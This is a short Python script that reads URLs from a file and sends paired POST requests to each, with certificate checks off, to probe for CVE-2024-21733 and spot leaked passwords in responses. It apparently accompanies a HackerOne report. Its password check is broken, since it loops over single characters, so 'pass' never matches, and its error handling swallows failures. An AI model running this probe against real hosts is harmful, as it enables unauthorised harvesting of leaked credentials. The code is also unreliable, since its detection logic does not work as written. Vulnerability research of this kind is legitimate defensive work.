import requests
import sys
import random

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""
https://hackerone.com/reports/2327341
"""


def send_post_requests_from_file(file_path):
    data = "X"
    
    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()
            urls = [url.strip() for url in urls]

            for url in urls:
                url = "{}?cb={}".format(url, random.randrange(999))
                try:
                    res_post_without_data = requests.post(url, verify=False, timeout=10)
                    res_post = requests.post(url, data=data, verify=False, timeout=10)

                    len_pwd = len(res_post_without_data.content)
                    len_p = len(res_post.content)

                    if len_p not in range(len_pwd - 50, len_pwd + 50) and res_post.status_code not in [404, 200, 403] and res_post.status_code != res_post_without_data.status_code and len_p != 0:
                        print(f"[NA][{res_post_without_data.status_code}][{len_pwd}b] :: [X][{res_post.status_code}][{len_p}b] | {url}")
                    else:
                        for rp in res_post.text:
                            if "pass" in rp or "PASS" in rp:
                                print(f"CVE-2024-21733 seem's work on {url} :: {rp}")
                            else:
                                pass
                except requests.ConnectionError:
                    pass
                except requests.Timeout:
                    pass
                except Exception as e:
                    pass
                    #print(f"Error {url} : {str(e)}")
    except FileNotFoundError:
        print(f"{file_path} not found.")

if __name__ == "__main__":
    file_path = sys.argv[1]
    send_post_requests_from_file(file_path)